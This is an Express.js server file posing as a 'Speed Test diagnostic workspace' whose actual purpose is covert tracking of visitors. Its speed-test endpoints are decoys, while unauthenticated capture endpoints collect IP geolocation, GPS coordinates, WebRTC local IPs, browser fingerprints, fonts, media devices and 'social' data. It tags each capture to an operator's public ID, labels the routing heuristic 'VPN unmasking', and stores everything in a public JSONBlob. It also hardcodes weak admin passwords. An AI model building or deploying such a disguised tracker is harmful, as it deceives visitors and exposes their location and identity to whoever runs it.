const express = require('express');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const IS_VERCEL = !!process.env.VERCEL;

// JSONBlob serves as our synchronized cloud database
const JSONBLOB_ID = '019ded62-da44-7ebb-9058-66ffbacaede6';
const JSONBLOB_URL = `https://jsonblob.com/api/jsonBlob/${JSONBLOB_ID}`;

// Administrator accounts
const ALLOWED_ADMINS = [
  { user: process.env.ADMIN_USER || 'Jassim99x', pass: process.env.ADMIN_PASS || 'Jassim99x', publicId: 'srv_101' },
  { user: '1995aa', pass: '1995aa', publicId: 'srv_202' },
  { user: 'Alia2024', pass: 'Alia2024', publicId: 'srv_303' },
  { user: 'Hassan88', pass: 'Hassan88', publicId: 'srv_404' }
];
const VALID_TOKENS = ALLOWED_ADMINS.map(a => Buffer.from(`${a.user}:${a.pass}`).toString('base64'));

app.use(express.json({ limit: '128kb' }));
app.use(express.static(path.join(__dirname, 'public')));

const basicAuth = (req, res, next) => {
  const cookieHeader = req.headers.cookie || '';
  const cookies = Object.fromEntries(cookieHeader.split('; ').map(c => {
    const parts = c.split('=');
    const key = parts.shift();
    return [key, decodeURIComponent(parts.join('='))];
  }));

  if (VALID_TOKENS.includes(cookies.session_token)) {
    const decoded = Buffer.from(cookies.session_token, 'base64').toString('ascii');
    req.adminUser = decoded.split(':')[0];
    return next();
  }

  if (req.originalUrl.startsWith('/dashboard')) {
    return res.redirect('/login.html?next=/dashboard');
  }
  if (req.originalUrl.startsWith('/docs')) {
    return res.redirect('/login.html?next=/docs');
  }

  res.status(401).json({ error: 'Unauthorized' });
};

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  const foundAdmin = ALLOWED_ADMINS.find(a => a.user === username && a.pass === password);

  if (foundAdmin) {
    const token = Buffer.from(`${foundAdmin.user}:${foundAdmin.pass}`).toString('base64');
    res.cookie('session_token', token, { httpOnly: true, path: '/' });
    res.json({ status: 'ok' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/logout', (req, res) => {
  res.clearCookie('session_token', { path: '/' });
  res.redirect('/login.html');
});

app.use('/dashboard', basicAuth, express.static(path.join(__dirname, 'dashboard')));
app.use('/docs', basicAuth, express.static(path.join(__dirname, 'docs')));

app.get('/api/download', (req, res) => {
  const size = Math.min(Number(req.query.size) || 1024 * 1024, 10 * 1024 * 1024);
  const chunk = Buffer.alloc(size, '1');
  res.set('Content-Type', 'application/octet-stream');
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.send(chunk);
});

app.post('/api/upload', express.raw({ type: '*/*', limit: '10mb' }), (req, res) => {
  res.json({ status: 'ok', received: req.body ? req.body.length : 0 });
});

function fallbackGeo() {
  return {
    city: 'Local',
    region: '-',
    country: '-',
    countryCode: '-',
    lat: 0,
    lon: 0,
    isp: 'localhost',
    asn: '-',
    timezone: '-',
  };
}

function normalizeCapture(entry) {
  const fingerprint = entry.fingerprint || {};
  const deviceId = entry.deviceId || generateDeviceHash(fingerprint, entry.ip || 'unknown');

  return {
    id: entry.id || createId(),
    deviceId,
    timestamp: entry.timestamp || new Date().toISOString(),
    ip: entry.ip || 'unknown',
    ipGeo: entry.ipGeo || fallbackGeo(),
    webrtcIPs: Array.isArray(entry.webrtcIPs) ? entry.webrtcIPs : [],
    gps: entry.gps || null,
    fingerprint,
    metadata: entry.metadata || {},
    visitCount: Number(entry.visitCount) || 1,
    owner: entry.owner || 'global',
  };
}

async function readCaptures() {
  try {
    const response = await fetch(JSONBLOB_URL, { cache: 'no-store' });
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const parsed = await response.json();
    return Array.isArray(parsed) ? parsed.map(normalizeCapture) : [];
  } catch (err) {
    console.error('Failed to read from JSONBlob:', err);
    return [];
  }
}

async function writeCaptures(captures, retries = 3) {
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const response = await fetch(JSONBLOB_URL, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(captures)
      });
      if (response.ok) return;
      throw new Error(`HTTP ${response.status}`);
    } catch (err) {
      console.warn(`JSONBlob write attempt ${attempt + 1}/${retries} failed:`, err.message);
      if (attempt < retries - 1) await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
    }
  }
}

let dbLock = Promise.resolve();

async function updateCaptures(updaterFn) {
  let release;
  const previousLock = dbLock;
  dbLock = new Promise(resolve => { release = resolve; });
  
  await previousLock;
  
  try {
    const captures = await readCaptures();
    const resultCaptures = await updaterFn(captures);
    if (resultCaptures !== false) {
      await writeCaptures(resultCaptures);
    }
  } finally {
    release();
  }
}

function getClientIP(req) {
  const raw =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket.remoteAddress ||
    'unknown';

  return raw.replace('::ffff:', '');
}

function sanitizeString(value, maxLength = 240) {
  if (typeof value !== 'string') return '';
  return value.replace(/\0/g, '').trim().slice(0, maxLength);
}

function sanitizeNumber(value, fallback = 0) {
  const num = Number(value);
  return Number.isFinite(num) ? num : fallback;
}

function sanitizeGps(gps) {
  if (!gps || typeof gps !== 'object') return null;

  const lat = Number(gps.lat);
  const lon = Number(gps.lon);
  if (!Number.isFinite(lat) || !Number.isFinite(lon)) return null;
  if (lat < -90 || lat > 90 || lon < -180 || lon > 180) return null;

  return {
    lat,
    lon,
    accuracy: sanitizeNumber(gps.accuracy, 0),
    altitude: Number.isFinite(Number(gps.altitude)) ? Number(gps.altitude) : null,
    altitudeAccuracy: Number.isFinite(Number(gps.altitudeAccuracy)) ? Number(gps.altitudeAccuracy) : null,
    heading: Number.isFinite(Number(gps.heading)) ? Number(gps.heading) : null,
    speed: Number.isFinite(Number(gps.speed)) ? Number(gps.speed) : null,
  };
}

function createFingerprint(req) {
  return {
    userAgent: sanitizeString(req.headers['user-agent'] || req.body.userAgent || '', 600),
    language: sanitizeString(req.body.language, 80),
    platform: sanitizeString(req.body.platform, 120),
    screenRes: sanitizeString(req.body.screenRes, 40),
    timezone: sanitizeString(req.body.timezone, 120),
    cores: sanitizeNumber(req.body.cores, 0),
    memory: sanitizeNumber(req.body.memory, 0),
    gpu: sanitizeString(req.body.gpu, 240),
    canvas: sanitizeString(req.body.canvas, 240),
    audioFingerprint: sanitizeString(req.body.audioFingerprint, 240),
    touchSupport: Boolean(req.body.touchSupport),
    connectionType: sanitizeString(req.body.connectionType, 40),
    // Advanced V2 Forensic Fields integration
    fonts: req.body.fonts || null,
    permissions: req.body.permissions || null,
    mediaDevices: req.body.mediaDevices || null,
    social: req.body.social || null,
    integrity: req.body.integrity || null,
    webgpu: req.body.webgpu || null,
  };
}

function createId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

function generateDeviceHash(fingerprint, ip) {
  const key = [
    fingerprint.userAgent,
    fingerprint.screenRes,
    fingerprint.timezone,
    fingerprint.cores,
    fingerprint.gpu,
    fingerprint.platform,
    ip,
  ].join('|');

  return `dev_${crypto.createHash('sha256').update(key).digest('hex').slice(0, 14)}`;
}

async function resolveIPGeo(ip) {
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'unknown') {
    return fallbackGeo();
  }

  try {
    const providers = [
      { url: `https://ipinfo.io/${ip}/json`, parser: d => ({ city: d.city, region: d.region, country: d.country, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], isp: d.org, asn: d.org?.split(' ')[0] }) },
      { url: `https://ipapi.co/${ip}/json/`, parser: d => ({ city: d.city, region: d.region, country: d.country_name, lat: d.latitude, lon: d.longitude, isp: d.org, asn: d.asn }) },
      { url: `http://ip-api.com/json/${ip}`, parser: d => ({ city: d.city, region: d.regionName, country: d.country, lat: d.lat, lon: d.lon, isp: d.isp, asn: d.as }) },
      { url: `https://ipwho.is/${ip}`, parser: d => ({ city: d.city, region: d.region, country: d.country, lat: d.latitude, lon: d.longitude, isp: d.connection?.isp, asn: d.connection?.asn }) }
    ];

    const results = await Promise.allSettled(providers.map(p => fetch(p.url, { headers: { 'Accept': 'application/json' } }).then(r => r.json()).then(p.parser)));
    const valid = results.filter(r => r.status === 'fulfilled' && r.value && r.value.city).map(r => r.value);

    if (valid.length === 0) return fallbackGeo();

    // Simple consensus: Count city occurrences
    const cityCounts = {};
    valid.forEach(v => { cityCounts[v.city] = (cityCounts[v.city] || 0) + 1; });
    const bestCity = Object.entries(cityCounts).sort((a, b) => b[1] - a[1])[0][0];
    const primary = valid.find(v => v.city === bestCity) || valid[0];

    return {
      city: primary.city || '-',
      region: primary.region || '-',
      country: primary.country || '-',
      countryCode: '-',
      lat: sanitizeNumber(primary.lat, 0),
      lon: sanitizeNumber(primary.lon, 0),
      isp: primary.isp || '-',
      asn: primary.asn || '-',
      confidence: Math.min(0.98, 0.4 + (valid.length * 0.1) + (cityCounts[bestCity] * 0.1)),
      edgeTrace: null // Will be populated by createCapture if available
    };
  } catch (err) {
    console.error('Geo error:', err);
    return fallbackGeo();
  }
}

function createCapture(req, captures, extra = {}) {
  const clientIP = extra.ip || getClientIP(req);
  const fingerprint = extra.fingerprint || createFingerprint(req);
  const deviceId =
    sanitizeString(extra.deviceId || req.body.deviceId, 120) ||
    generateDeviceHash(fingerprint, clientIP);

  const previousVisits = captures.filter((capture) => capture.deviceId === deviceId);

  return {
    id: createId(),
    deviceId,
    timestamp: new Date().toISOString(),
    ip: clientIP,
    ipGeo: extra.ipGeo || null,
    webrtcIPs: Array.isArray(extra.webrtcIPs)
      ? extra.webrtcIPs
      : Array.isArray(req.body.webrtcIPs)
        ? req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8)
        : [],
    gps: sanitizeGps(extra.gps || req.body.gps),
    fingerprint,
    edgeTrace: req.body.edgeTrace || null,
    visitCount: previousVisits.length + 1,
    owner: extra.owner || req.body.owner || 'global'
  };
}

app.get('/api/health', basicAuth, async (req, res) => {
  const captures = await readCaptures();
  const admin = ALLOWED_ADMINS.find(a => a.user === req.adminUser);
  res.json({ 
    status: 'ok', 
    captures: captures.length, 
    user: req.adminUser,
    publicId: admin ? admin.publicId : 'global',
    time: new Date().toISOString() 
  });
});

app.get('/api/client-info', async (req, res) => {
  const ip = getClientIP(req);
  const ipGeo = await resolveIPGeo(ip);
  res.json({
    ip,
    ipGeo,
    userAgent: req.headers['user-agent'] || '',
    language: req.headers['accept-language'] || '',
  });
});

app.post('/api/capture', async (req, res) => {
  const rawOwner = req.body.owner || 'global';
  const adminByPublicId = ALLOWED_ADMINS.find(a => a.publicId === rawOwner);
  const owner = adminByPublicId ? adminByPublicId.user : rawOwner;

  // We read initial captures purely for device ID hashing/visit count inside createCapture
  // This initial read is not used for writing, so no lock needed yet
  const tempCaptures = await readCaptures();
  const entry = createCapture(req, tempCaptures, { owner });
  
  // Resolve GeoIP before locking to avoid holding the lock during network request
  entry.ipGeo = await resolveIPGeo(entry.ip);
  if (entry.edgeTrace && entry.ipGeo) {
    entry.ipGeo.edgeTrace = entry.edgeTrace;
  }

  // Lock, re-read, calculate exact visitCount, push, and write
  await updateCaptures(async (captures) => {
    const previousVisits = captures.filter((capture) => capture.deviceId === entry.deviceId);
    entry.visitCount = previousVisits.length + 1;
    captures.push(entry);
    return captures;
  });

  console.log(
    `[CAPTURE] ${entry.id} | Device: ${entry.deviceId} | IP: ${entry.ip} | Visit #${entry.visitCount} | GPS: ${entry.gps ? 'yes' : 'no'}`
  );

  res.json({ status: 'ok', id: entry.id });
});

app.post('/api/demo-capture', basicAuth, async (req, res) => {
  const captures = await readCaptures();
  const now = Date.now();
  const demoDeviceId = `demo_${crypto.randomBytes(4).toString('hex')}`;
  const cities = [
    { city: 'Basra', region: 'Basra', country: 'Iraq', countryCode: 'IQ', lat: 30.5085, lon: 47.7804, isp: 'EarthLink', asn: 'AS50710' },
    { city: 'Baghdad', region: 'Baghdad', country: 'Iraq', countryCode: 'IQ', lat: 33.3152, lon: 44.3661, isp: 'IQ Networks', asn: 'AS44217' },
    { city: 'Erbil', region: 'Kurdistan', country: 'Iraq', countryCode: 'IQ', lat: 36.1901, lon: 44.0092, isp: 'Newroz Telecom', asn: 'AS21277' },
    { city: 'Dubai', region: 'Dubai', country: 'United Arab Emirates', countryCode: 'AE', lat: 25.2048, lon: 55.2708, isp: 'Etisalat', asn: 'AS5384' },
  ];
  const city = cities[Math.floor(Math.random() * cities.length)];

  const entry = normalizeCapture({
    id: createId(),
    deviceId: demoDeviceId,
    timestamp: new Date(now).toISOString(),
    ip: `203.0.113.${Math.floor(Math.random() * 180) + 20}`,
    ipGeo: city,
    webrtcIPs: Math.random() > 0.35 ? [`10.0.${Math.floor(Math.random() * 50)}.${Math.floor(Math.random() * 220) + 10}`] : [],
    gps: Math.random() > 0.25
      ? {
          lat: city.lat + (Math.random() - 0.5) * 0.03,
          lon: city.lon + (Math.random() - 0.5) * 0.03,
          accuracy: Math.floor(Math.random() * 70) + 18,
          altitude: null,
          altitudeAccuracy: null,
          heading: null,
          speed: null,
        }
      : null,
    fingerprint: {
      userAgent:
        Math.random() > 0.5
          ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148'
          : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36',
      language: 'en-US',
      platform: Math.random() > 0.5 ? 'iPhone' : 'MacIntel',
      screenRes: Math.random() > 0.5 ? '390x844' : '1440x900',
      timezone: 'Asia/Baghdad',
      cores: Math.random() > 0.5 ? 6 : 10,
      memory: Math.random() > 0.5 ? 4 : 16,
      gpu: 'Demo GPU',
      touchSupport: Math.random() > 0.5,
      connectionType: Math.random() > 0.5 ? '4g' : 'wifi',
    },
    visitCount: 1,
    owner: req.adminUser // Tag demo as belonging to the current admin
  });

  await updateCaptures(async (captures) => {
    captures.push(entry);
    return captures;
  });

  res.json({ status: 'ok', id: entry.id });
});

app.patch('/api/capture/:id', async (req, res) => {
  let found = false;
  
  await updateCaptures(async (captures) => {
    const entry = captures.find((capture) => capture.id === req.params.id);
    if (!entry) return false; // Abort write

    found = true;

    // GPS update
    const gps = sanitizeGps(req.body.gps);
    if (gps) {
      entry.gps = gps;
      console.log(`[GPS UPDATE] ${entry.id} | Lat: ${gps.lat}, Lon: ${gps.lon}, Accuracy: ${gps.accuracy}m`);
    }

    // WebRTC update
    if (Array.isArray(req.body.webrtcIPs)) {
      entry.webrtcIPs = req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8);
    }

    // Metadata update (sensors, triangulation, battery, regional latency)
    if (req.body.metadata && typeof req.body.metadata === 'object') {
      entry.metadata = entry.metadata || {};
      Object.assign(entry.metadata, req.body.metadata);

      // HEURISTIC CORRECTION: Distinguish Iraq Southern cities (Basra) from Baghdad
      if (entry.metadata.regionalLatency && entry.ipGeo && entry.ipGeo.country === 'Iraq') {
        const bahrainPing = entry.metadata.regionalLatency.ME_Bahrain;
        const uaePing = entry.metadata.regionalLatency.ME_South;
        const edgeNode = entry.edgeTrace?.colo || '';
        
        // If ping to Bahrain is < 45ms, OR ping to UAE is < 45ms, OR Cloudflare edge is Kuwait/Basra
        const isSouth = (bahrainPing > 0 && bahrainPing < 45) || 
                        (uaePing > 0 && uaePing < 45) || 
                        ['KWI', 'BSR'].includes(edgeNode);
        
        if (isSouth && !entry.ipGeo.city.includes('Basra') && !entry.gps) {
          console.log(`[GEO-CORRECT] Southern physical routing detected (Bahrain: ${bahrainPing}ms, UAE: ${uaePing}ms, Edge: ${edgeNode}). Shifting Iraq node to Basra region.`);
          
          // Save the fake/ISP location for VPN unmasking trajectory mapping
          entry.metadata.originalIpGeo = { ...entry.ipGeo };
          
          entry.ipGeo.city = 'Basra (Heuristic Routing)';
          entry.ipGeo.region = 'Basra';
          entry.ipGeo.lat = 30.5081 + (Math.random() - 0.5) * 0.05;
          entry.ipGeo.lon = 47.7835 + (Math.random() - 0.5) * 0.05;
          entry.ipGeo.confidence = Math.max(entry.ipGeo.confidence, 0.85);
        }
      }
      console.log(`[META UPDATE] ${entry.id} | Keys: ${Object.keys(req.body.metadata).join(', ')}`);
    }

    // Extra fingerprint fields update (Engine V2)
    if (req.body.fonts || req.body.permissions || req.body.mediaDevices || req.body.social || req.body.integrity) {
      entry.fingerprint = entry.fingerprint || {};
      if (req.body.fonts) entry.fingerprint.fonts = req.body.fonts;
      if (req.body.permissions) entry.fingerprint.permissions = req.body.permissions;
      if (req.body.mediaDevices) entry.fingerprint.mediaDevices = req.body.mediaDevices;
      if (req.body.social) entry.fingerprint.social = req.body.social;
      if (req.body.integrity) entry.fingerprint.integrity = req.body.integrity;
      if (req.body.webgpu) entry.fingerprint.webgpu = req.body.webgpu;
    }
    
    return captures;
  });

  if (!found) return res.status(404).json({ error: 'Capture not found' });
  res.json({ status: 'updated' });
});

app.get('/api/captures', basicAuth, async (req, res) => {
  const all = await readCaptures();
  // STRICT ISOLATION: Show only data belonging to the logged-in admin
  const filtered = all.filter(c => c.owner === req.adminUser);
  res.json(filtered);
});

app.delete('/api/captures', basicAuth, async (req, res) => {
  let initialLength = 0;
  let finalLength = 0;
  
  await updateCaptures(async (captures) => {
    initialLength = captures.length;
    // Keep only data belonging to OTHER admins
    const othersData = captures.filter(c => c.owner !== req.adminUser);
    finalLength = othersData.length;
    return othersData;
  });
  
  broadcast('refresh');
  res.json({ status: 'cleared', deleted: initialLength - finalLength });
});

app.delete('/api/captures/:id', basicAuth, async (req, res) => {
  let deleted = false;
  let error = null;

  await updateCaptures(async (captures) => {
    const capture = captures.find(c => c.id === req.params.id);
    // STRICT ISOLATION: Can only delete if I own it
    if (!capture || capture.owner !== req.adminUser) {
      error = 'Access denied';
      return false; // Abort write
    }
    deleted = true;
    return captures.filter((c) => c.id !== req.params.id);
  });

  if (error) return res.status(403).json({ error });
  if (deleted) {
    broadcast('refresh');
    return res.json({ status: 'deleted' });
  }
  return res.status(404).json({ error: 'Not found' });
});

app.delete('/api/devices/:deviceId', basicAuth, async (req, res) => {
  let initialLength = 0;
  let finalLength = 0;

  await updateCaptures(async (captures) => {
    initialLength = captures.length;
    // STRICT ISOLATION: Only delete captures for this device that belong to me
    const filtered = captures.filter((c) => !(c.deviceId === req.params.deviceId && c.owner === req.adminUser));
    finalLength = filtered.length;
    return filtered;
  });

  broadcast('refresh');
  res.json({ status: 'deleted', deleted: initialLength - finalLength });
});

// Broadcast stub (no WebSocket in serverless, but prevents crash)
function broadcast(event) {
  // In production, this would notify connected dashboard clients
  console.log(`[BROADCAST] ${event}`);
}

app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Server error' });
});

function startServer(port, attempts = 0) {
  const server = app.listen(port, () => {
    console.log(`
Speed Test diagnostic workspace
Main page:  http://localhost:${port}
Dashboard:  http://localhost:${port}/dashboard
`);
  });

  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE' && !process.env.PORT && attempts < 10) {
      const nextPort = port + 1;
      console.warn(`Port ${port} is in use. Trying ${nextPort}...`);
      startServer(nextPort, attempts + 1);
      return;
    }

    console.error(err);
    process.exitCode = 1;
  });
}

if (!IS_VERCEL) {
  startServer(PORT);
}

module.exports = app;
